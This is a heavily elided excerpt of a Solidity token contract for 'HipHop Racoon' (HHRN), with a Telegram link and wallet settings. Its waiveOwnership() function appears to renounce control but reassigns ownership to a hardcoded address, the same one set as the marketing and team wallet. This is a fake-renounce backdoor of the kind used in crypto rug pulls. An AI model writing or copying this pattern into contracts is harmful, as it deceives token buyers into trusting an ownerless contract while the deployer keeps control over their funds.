...
/**
Telegram : https://t.me/HipHopRacoon
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x74AC32aC2814bEcb8A9c28f53C4e13071830213a);
    }
...
contract HipHopRacoon is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "HipHop Racoon";
    string private _symbol = "HHRN";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x74AC32aC2814bEcb8A9c28f53C4e13071830213a);
    address payable private teamWalletAddress = payable(0x74AC32aC2814bEcb8A9c28f53C4e13071830213a);
